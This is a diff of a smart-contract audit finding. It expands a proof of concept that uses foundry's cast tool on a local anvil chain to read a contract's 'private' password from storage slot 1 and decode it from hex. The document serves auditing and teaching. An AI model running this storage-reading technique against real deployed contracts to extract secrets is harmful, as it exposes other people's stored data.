@@ -71,8 +71,44 @@ I show one such method of reading any data off chain below.
 :br
 **Proof of Concept:**The below test case shows how anyone could read the password directly from the blockchain. We use foundry's cast tool to read directly from the storage of the contract, without being the owner.
 
-Create a locally running chain
-
-```Solidity
+- Create a locally running chain
+```solidity
 make anvil
 ```
+
+- Deploy the contract to the chain
+
+```Solidity
+make deploy
+```
+
+Run the storage tool
+
+We use 1 because that's the storage slot of s\_password in the contract.
+
+```Solidity
+cast storage <ADDRESS_HERE> 1 --rpc-url http://127.0.0.1:8545
+```
+
+You'll get an output that looks like this:
+
+```Solidity
+0x6d7950617373776f726400000000000000000000000000000000000000000014
+```
+
+You can then parse that hex to a string with:
+
+```Solidity
+cast parse-bytes32-string 0x6d7950617373776f726400000000000000000000000000000000000000000014
+```
+
+And get an output of:
+
+```Solidity
+myPassword
+```
+
+:br
+**Recommended Mitigation:**
+
+</details>
